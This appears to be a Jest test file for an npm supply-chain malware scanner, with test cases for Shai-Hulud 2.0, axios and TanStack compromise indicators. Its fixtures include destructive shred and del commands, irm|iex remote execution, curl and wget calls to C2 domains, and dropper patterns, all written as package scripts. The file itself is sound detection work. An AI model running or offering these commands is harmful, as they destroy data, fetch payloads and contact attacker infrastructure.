import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import { analyzeScripts, analyzeManifest, scanProject } from '../src/index';

const TEST_DIR = path.join(__dirname, 'temp_research_test');

describe('Research Heuristics (Shai-Hulud 2.0)', () => {
  beforeAll(() => {
    if (fs.existsSync(TEST_DIR)) {
      fs.rmSync(TEST_DIR, { recursive: true, force: true });
    }
    if (!fs.existsSync(TEST_DIR)) {
      fs.mkdirSync(TEST_DIR);
    }
  });

  afterAll(() => {
    if (fs.existsSync(TEST_DIR)) {
      fs.rmSync(TEST_DIR, { recursive: true, force: true });
    }
  });

  describe('Script Analysis', () => {
    test('should detect destructive shred command', () => {
      const pkg = {
        scripts: {
          cleanup: 'shred -uvz -n 1 /home/user',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'cleanup': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect destructive Windows del command', () => {
      const pkg = {
        scripts: {
          cleanup: 'del /F /Q /S "%USERPROFILE%*"',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'cleanup': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect PowerShell Bun install', () => {
      const pkg = {
        scripts: {
          install: 'irm bun.sh/install.ps1|iex',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'install': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect C2 signature', () => {
      const pkg = {
        scripts: {
          postinstall: 'echo "Sha1-Hulud: The Second Coming"',
        },
      };
      const findings = analyzeScripts(pkg);
      // "The Second Coming" is in the signatures list
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: "Suspicious script detected in 'postinstall': Known Malware Signature Match",
            severity: 'critical',
          }),
        ]),
      );
    });
  });

  describe('Entropy Analysis', () => {
    test('should detect high entropy in large files', async () => {
      const malwareFile = 'bun_environment.js';
      const malwarePath = path.join(TEST_DIR, malwareFile);

      // Create a large file (> 5MB) with high entropy (random data)
      const size = 6 * 1024 * 1024; // 6MB
      const buffer = crypto.randomBytes(size);
      fs.writeFileSync(malwarePath, buffer);

      // Create a dummy package.json
      fs.writeFileSync(
        path.join(TEST_DIR, 'package.json'),
        JSON.stringify({ name: 'test-pkg', version: '1.0.0' }),
      );

      // Scan
      try {
        const result = await scanProject(TEST_DIR, []);
        const entropyWarning = result.warnings.find(
          (w) => w.includes('HIGH RISK file detected') && w.includes('High Entropy'),
        );
        expect(entropyWarning).toBeDefined();
        expect(entropyWarning).toContain(malwareFile);
      } catch {
        // scanProject might throw if no lockfile, but we are testing file scanning which happens before lockfile check?
        // Actually scanProject throws if no lockfile is found.
        // Let's create a dummy lockfile to satisfy it.
        fs.writeFileSync(
          path.join(TEST_DIR, 'package-lock.json'),
          JSON.stringify({
            name: 'test-pkg',
            version: '1.0.0',
            lockfileVersion: 2,
            packages: {},
          }),
        );

        const result = await scanProject(TEST_DIR, []);
        const entropyWarning = result.warnings.find(
          (w) => w.includes('HIGH RISK file detected') && w.includes('High Entropy'),
        );
        expect(entropyWarning).toBeDefined();
      }
    }, 30000);

    test('should NOT flag low entropy large files', async () => {
      const safeFile = 'bun_environment.js'; // Reusing name to trigger check, but content is safe
      const safePath = path.join(TEST_DIR, safeFile);

      // Create a large file (> 5MB) with low entropy (repeated char)
      const size = 6 * 1024 * 1024; // 6MB
      const buffer = Buffer.alloc(size, 'A');
      fs.writeFileSync(safePath, buffer);

      // Ensure package.json and lockfile exist (from previous test)
      if (!fs.existsSync(path.join(TEST_DIR, 'package.json'))) {
        fs.writeFileSync(
          path.join(TEST_DIR, 'package.json'),
          JSON.stringify({ name: 'test-pkg', version: '1.0.0' }),
        );
      }
      if (!fs.existsSync(path.join(TEST_DIR, 'package-lock.json'))) {
        fs.writeFileSync(
          path.join(TEST_DIR, 'package-lock.json'),
          JSON.stringify({
            name: 'test-pkg',
            version: '1.0.0',
            lockfileVersion: 2,
            packages: {},
          }),
        );
      }

      const result = await scanProject(TEST_DIR, []);
      const entropyWarning = result.warnings.find(
        (w) => w.includes('HIGH RISK file detected') && w.includes('High Entropy'),
      );
      expect(entropyWarning).toBeUndefined();

      // It might still be flagged as "Suspicious file" because of the name, but NOT "HIGH RISK ... High Entropy"
      const suspiciousWarning = result.warnings.find((w) => w.includes('Suspicious file detected'));
      expect(suspiciousWarning).toBeDefined();
    }, 30000);
  });
});

describe('Axios Supply Chain Attack Detection (March 2026)', () => {
  describe('Script Analysis - Axios Patterns', () => {
    test('should detect plain-crypto-js as known malware signature', () => {
      const pkg = {
        scripts: {
          postinstall: 'node -e "require(\'plain-crypto-js\')"',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect sfrclak.com C2 domain in scripts', () => {
      const pkg = {
        scripts: {
          postinstall: 'curl http://sfrclak.com:8000/6202033 -o payload',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect OrDeR_7077 XOR key in scripts', () => {
      const pkg = {
        scripts: {
          postinstall: "node -e \"var key='OrDeR_7077'; decode(stq)\"",
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect nohup RAT dropper pattern', () => {
      // Test string that matches the execSync+nohup pattern used in the axios attack dropper
      const pkg = {
        scripts: {
          postinstall: "execSync('nohup ./payload &')",
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Background process execution'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect self-deleting dropper script pattern', () => {
      const pkg = {
        scripts: {
          postinstall: "fs.unlink('setup.js', () => {})",
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Self-deleting dropper script'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect PowerShell irm|iex remote execution', () => {
      const pkg = {
        scripts: {
          postinstall: 'irm https://evil.com/payload.ps1 | iex',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('PowerShell remote execution'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect spoofed User-Agent string from axios attack', () => {
      const pkg = {
        scripts: {
          postinstall:
            'curl -A "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)" http://evil.com',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect node setup.js execution', () => {
      const pkg = {
        scripts: {
          postinstall: 'node setup.js',
        },
      };
      const findings = analyzeScripts(pkg);
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });
  });

  describe('Known Threats CSV - Axios Packages', () => {
    const csvPath = path.join(__dirname, '..', 'sources', 'known-threats.csv');

    test('should include axios compromised versions', () => {
      const content = fs.readFileSync(csvPath, 'utf8');
      expect(content).toContain('axios,1.14.1');
      expect(content).toContain('axios,0.30.4');
    });

    test('should include plain-crypto-js', () => {
      const content = fs.readFileSync(csvPath, 'utf8');
      expect(content).toContain('plain-crypto-js,4.2.1');
      expect(content).toContain('plain-crypto-js,4.2.0');
    });

    test('should include related attacker packages', () => {
      const content = fs.readFileSync(csvPath, 'utf8');
      expect(content).toContain('@shadanai/openclaw');
      expect(content).toContain('@qqbrowser/openclaw-qbot,0.0.130');
    });
  });
});

describe('TanStack Wave 4 Detection (May 2026, GHSA-g7cv-rxg3-hmpx)', () => {
  describe('Script Analysis - TanStack Patterns', () => {
    test('should detect EveryBoiWeBuildIsAWormyBoi campaign identifier', () => {
      const findings = analyzeScripts({
        scripts: { prepare: 'echo "EveryBoiWeBuildIsAWormyBoi"' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner dead-mans-switch string', () => {
      const findings = analyzeScripts({
        scripts: { postinstall: '# IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect OhNoWhatsGoingOnWithGitHub token-recovery magic string', () => {
      const findings = analyzeScripts({
        scripts: { prepare: 'echo OhNoWhatsGoingOnWithGitHub' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect svksjrhjkcejg PBKDF2 salt', () => {
      const findings = analyzeScripts({
        scripts: { prepare: 'const salt="svksjrhjkcejg";' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect bun run tanstack_runner.js prepare hook', () => {
      const findings = analyzeScripts({
        scripts: { prepare: 'bun run tanstack_runner.js && exit 1' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect filev2.getsession.org C2 endpoint', () => {
      const findings = analyzeScripts({
        scripts: { postinstall: 'curl https://filev2.getsession.org/upload' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect api.masscan.cloud C2 domain', () => {
      const findings = analyzeScripts({
        scripts: { postinstall: 'curl api.masscan.cloud/beacon' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect git-tanstack.com impersonation domain', () => {
      const findings = analyzeScripts({
        scripts: { postinstall: 'curl git-tanstack.com/payload' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect litter.catbox.moe second-stage URL', () => {
      const findings = analyzeScripts({
        scripts: { postinstall: 'wget litter.catbox.moe/h8nc9u.js' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should detect dependabout/ branch impersonation pattern', () => {
      const findings = analyzeScripts({
        scripts: { prepare: 'git checkout dependabout/setup-formatter' },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            message: expect.stringContaining('Known Malware Signature Match'),
            severity: 'critical',
          }),
        ]),
      );
    });
  });

  describe('Manifest Analysis - TanStack Tampering', () => {
    test('should flag known-bad commit hash 79ac49eedf in any dep section', () => {
      const findings = analyzeManifest({
        optionalDependencies: {
          '@tanstack/setup': 'github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c',
        },
      });
      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            ruleId: 'malicious-git-ref',
            severity: 'critical',
          }),
        ]),
      );
    });

    test('should flag truncated 79ac49eedf ref', () => {
      const findings = analyzeManifest({
        dependencies: {
          'some-pkg': 'github:tanstack/router#79ac49eedf',
        },
      });
      expect(findings.map((f) => f.ruleId)).toContain('malicious-git-ref');
    });

    test('should flag @tanstack/setup phantom dep in optionalDependencies', () => {
      const findings = analyzeManifest({
        optionalDependencies: {
          '@tanstack/setup': 'github:tanstack/router#deadbeef00000000000000000000000000000000',
        },
      });
      expect(findings.map((f) => f.ruleId)).toContain('tanstack-setup-phantom-dep');
    });

    test('should flag a generic commit-pinned optional git dep', () => {
      const findings = analyzeManifest({
        optionalDependencies: {
          'something-evil': 'github:attacker/repo#abcdef1234567890abcdef1234567890abcdef12',
        },
      });
      expect(findings.map((f) => f.ruleId)).toContain('commit-pinned-optional-dep');
    });

    test('should NOT flag a normal semver dependency', () => {
      const findings = analyzeManifest({
        dependencies: {
          react: '^19.0.0',
          axios: '~1.7.0',
        },
        optionalDependencies: {
          fsevents: '^2.3.3',
        },
      });
      expect(findings).toEqual([]);
    });

    test('should respect suppressedRules config', () => {
      const findings = analyzeManifest(
        {
          optionalDependencies: {
            '@tanstack/setup': 'github:tanstack/router#79ac49eedf',
          },
        },
        { suppressedRules: ['malicious-git-ref', 'tanstack-setup-phantom-dep'] },
      );
      expect(findings).toEqual([]);
    });
  });

  describe('Malware Filenames - TanStack', () => {
    const TEST_DIR_TS = path.join(__dirname, 'temp_tanstack_test');
    beforeAll(() => {
      if (fs.existsSync(TEST_DIR_TS)) fs.rmSync(TEST_DIR_TS, { recursive: true, force: true });
      fs.mkdirSync(TEST_DIR_TS);
    });
    afterAll(() => {
      if (fs.existsSync(TEST_DIR_TS)) fs.rmSync(TEST_DIR_TS, { recursive: true, force: true });
    });

    test('should flag router_init.js dropped in the project root', async () => {
      fs.writeFileSync(path.join(TEST_DIR_TS, 'router_init.js'), 'console.log("payload");');
      fs.writeFileSync(
        path.join(TEST_DIR_TS, 'package.json'),
        JSON.stringify({ name: 'x', version: '1.0.0' }),
      );
      fs.writeFileSync(
        path.join(TEST_DIR_TS, 'package-lock.json'),
        JSON.stringify({ name: 'x', version: '1.0.0', lockfileVersion: 2, packages: {} }),
      );

      const result = await scanProject(TEST_DIR_TS, []);
      expect(result.warnings.some((w) => w.includes('router_init.js'))).toBe(true);
    });

    test('should flag tanstack_runner.js dropped in the project root', async () => {
      fs.writeFileSync(path.join(TEST_DIR_TS, 'tanstack_runner.js'), 'console.log("runner");');
      const result = await scanProject(TEST_DIR_TS, []);
      expect(result.warnings.some((w) => w.includes('tanstack_runner.js'))).toBe(true);
    });
  });

  describe('Known Threats CSV - TanStack Packages', () => {
    const csvPath = path.join(__dirname, '..', 'sources', 'known-threats.csv');
    const content = fs.readFileSync(csvPath, 'utf8');

    test('should include primary TanStack router packages', () => {
      expect(content).toContain('@tanstack/react-router,1.169.5');
      expect(content).toContain('@tanstack/react-router,1.169.8');
      expect(content).toContain('@tanstack/vue-router,1.169.5');
      expect(content).toContain('@tanstack/solid-router,1.169.8');
      expect(content).toContain('@tanstack/router-core,1.169.5');
    });

    test('should include TanStack start packages', () => {
      expect(content).toContain('@tanstack/react-start,1.167.68');
      expect(content).toContain('@tanstack/react-start,1.167.71');
      expect(content).toContain('@tanstack/router-plugin,1.167.38');
      expect(content).toContain('@tanstack/router-plugin,1.167.41');
    });

    test('should include @mistralai/mistralai secondary victim', () => {
      expect(content).toContain('@mistralai/mistralai,2.2.2');
      expect(content).toContain('@mistralai/mistralai,2.2.3');
      expect(content).toContain('@mistralai/mistralai,2.2.4');
    });
  });
});
